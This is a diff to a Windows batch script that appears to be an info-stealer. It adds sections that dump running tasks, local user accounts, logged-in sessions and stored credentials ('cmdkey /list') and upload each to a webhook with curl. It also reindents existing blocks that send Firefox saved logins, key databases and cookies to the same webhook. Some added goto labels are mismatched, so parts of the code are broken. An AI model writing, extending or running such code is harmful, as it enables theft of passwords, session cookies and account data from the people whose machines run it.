@@ -39,6 +39,42 @@ goto skipsysteminfocapture
 	2>NUL del %tempsys%
 :skipsysteminfocapture
 
+:: TASK LIST - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
+:: ------------------------------------------------------------------
+goto skiptasklist
+	set temptasklist=%appdata%\tasklist.txt
+	2>NUL tasklist > %temptasklist%
+	curl --silent --output /dev/null -F tasks=@%temptasklist% %webhook%
+	2>NUL del %temptasklist%
+:skiptasklist
+
+:: NET USER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
+:: ------------------------------------------------------------------
+goto skipnetuser
+	set netuser=%appdata%\netuser.txt
+	2>NUL net user > %netuser%
+	curl --silent --output /dev/null -F tasks=@%netuser% %webhook%
+	2>NUL del %netuser%
+:skipnetuser
+
+:: QUSER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
+:: ------------------------------------------------------------------
+goto skipquser
+	set quser=%appdata%\quser.txt
+	2>NUL quser > %quser%
+	curl --silent --output /dev/null -F tasks=@%quser% %webhook%
+	2>NUL del %quser%
+:skipnetuser
+
+:: CMDKEY - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
+:: ------------------------------------------------------------------
+goto skipcmdkey
+	set cmdkey=%appdata%\cmdkey.txt
+	2>NUL cmdkey /list > %cmdkey%
+	curl --silent --output /dev/null -F tasks=@%cmdkey% %webhook%
+	2>NUL del %cmdkey%
+:skipnetuser
+
 :: CHROME - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------
 goto skipchrome
@@ -75,12 +111,12 @@ goto skipvivaldi
 :: FIREFOX - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: -------------------------------------------------------
 goto skipfirefox
-curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- FIREFOX -```\"}"  %webhook%
+	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- FIREFOX -```\"}"  %webhook%
 for /f %%f in ('dir /b %appdata%\Mozilla\Firefox\Profiles') do (
-		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\logins.json %webhook%
-		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\key3.db %webhook%
-		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\key4.db %webhook%
-		curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\cookies.sqlite %webhook%
+	curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\logins.json %webhook%
+	curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\key3.db %webhook%
+	curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\key4.db %webhook%
+	curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\cookies.sqlite %webhook%
 	)
 )
 :skipfirefox
